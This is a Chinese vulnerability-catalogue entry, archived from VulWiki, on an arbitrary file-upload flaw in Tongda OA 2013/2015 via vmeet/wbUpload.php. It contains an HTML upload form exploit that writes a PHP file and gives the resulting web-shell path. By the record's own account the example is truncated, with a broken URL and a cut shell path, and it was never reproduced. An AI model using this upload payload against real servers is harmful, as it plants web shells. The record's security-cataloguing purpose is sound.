---
source: "hatch 补库批 20260928"
title: "通达OA vmeet wbUpload后缀上传"
product: "通达OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "2013/2015"
prerequisites: "未说明"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEoa%20%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
category_recommendation: "OA / 通达"
id: "vw-be1a6fef02313d736c0a0826"
entity_id: "ve-be1a6fef02313d736c0a0826"
schema_version: "1"
---

# 通达OA vmeet wbUpload后缀上传

## 条目说明

- 对象与具体问题：通达OA；vmeet wbUpload后缀上传
- 版本、配置及部署条件：2013/2015
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- form action URL断行、落地URL截为test.ph，正文残缺
- fileName.php+与上传jpg关系需实际平台解释；无认证/修复

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

一、漏洞简介
------------

二、漏洞影响
------------

2013、2015版本

三、复现过程
------------

EXP:

    <form enctype="multipart/form-data" action="http://0-sec.org/general/vmeet/wbUpload.php
    ?fileName=test.php+" method="post">
    <input type="file" name="Filedata" size="50"><br>
    <input type="submit" value="Upload">
    </form>

上传jpg之后shell地址为

    http://0-sec.org/general/vmeet/wbUpload/test.ph
